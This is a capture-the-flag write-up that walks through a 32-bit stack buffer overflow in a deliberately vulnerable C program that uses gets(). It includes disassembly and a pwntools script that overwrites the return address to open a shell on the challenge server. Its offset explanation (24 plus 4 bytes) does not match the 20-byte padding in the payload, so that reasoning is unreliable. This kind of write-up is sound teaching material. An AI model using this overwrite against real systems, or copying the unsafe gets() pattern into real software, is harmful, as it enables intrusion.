---
title:          "Baby Buffer Overflow - 32bit (Huntress CTF 2024)"
pubDate:        2024-11-27
description:    CTF ComSec CyberSecurity Write-up Huntress Huntress-CTF-2024
hideListing:    true
---

> Author: @aenygma
> 
> Can you command this program to where it cannot go?
> To get the flag, you must somehow take control of its excecution.
> Is it even possible?

Looking at the provided `C` code:

```c 
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

We can tell that there is **no stack pointer protection**, and to help us, *position-independent executable* compiling is disable. This means function stack frames are placed back-to-back and addresses are as they would be. We want to hit the buffer in `vuln()` so that the `return` function returns back up to `target` instead of back to `main`. Decompiling the offered program in Binja, the `target` is mapped to location `080491f5  int32_t target()`, while the `vuln` is as follows:

```
08049236  int32_t vuln()

08049236  55                 push    ebp {__saved_ebp}
08049237  89e5               mov     ebp, esp {__saved_ebp}
08049239  83ec18             sub     esp, 0x18
0804923c  83ec0c             sub     esp, 0xc
0804923f  8d45e8             lea     eax, dword ptr [ebp-0x18 {var_1c}]
08049242  50                 push    eax {var_1c} {var_2c}
08049243  e8d8fdffff         call    gets
08049248  83c410             add     esp, 0x10
0804924b  b800000000         mov     eax, 0x0
08049250  c9                 leave    {__saved_ebp}
08049251  c3                 ret      {__return_addr}
```

We are interested in the location in the stack that stores the buffer, and the location that the `__saved_ebp` is pushed it. 
1. `push ebp {__saved_ebp}` stores the previous base stack pointer value to the stack, 
2. `mov ebp, esp {__saved_ebp}` sets the new stack base to the current stack pointer
3. `sub esp, 0x18` increases the stack by 0x18 bytes
4. `lea eax, dword ptr [ebp-0x18 {var_1c}]` calculates the effective address of *0x18 bytes behind the stack pointer*.

This is what it would look like:

```

    +----------+ \
    | ret addr | |
    +-        -+ |
    | ret addr | | 
    +-        -+ | portion we target
    | ret addr | |
    +-        -+ |
    | ret addr | |
    +----------+ / 
    | old ebp  |
    +-        -+
    | old ebp  |
    +-        -+
    | old ebp  |
    +-        -+
    | old ebp  |
    +----------+ <- ebp
    |          |
    +----------+ <- esp-0x18
      .......
    +----------+
    |          | 
    +----------+ <- esp

```

Starting from the `esp` below, data will get pushed in up until the last *blank* byte at `esp-0x18`. So by entering 24 random characters, we hit the and of the stack. The next four bytes are the `old esp` position, and above that is the precious `{__return_addr}`. We will need to key in `0x080491f5`, but not with ascii characters of course. So we use `pwntools` in python to help us.

```py
from pwn import *

target_function_address = 0x080491f5  # Address of target function

# Construct the payload
payload = b'A' * 16 + b'B' * 4 + p32(target_function_address)

# Connect to the remote service
p = remote("challenge.ctf.games", PORT)


# Send the payload
p.sendline(payload)


# Drop into interactive mode to access the shell
p.interactive()
```

We get dropped into the shell after running this, and we are free to roam the world (and print the file containing the flag).

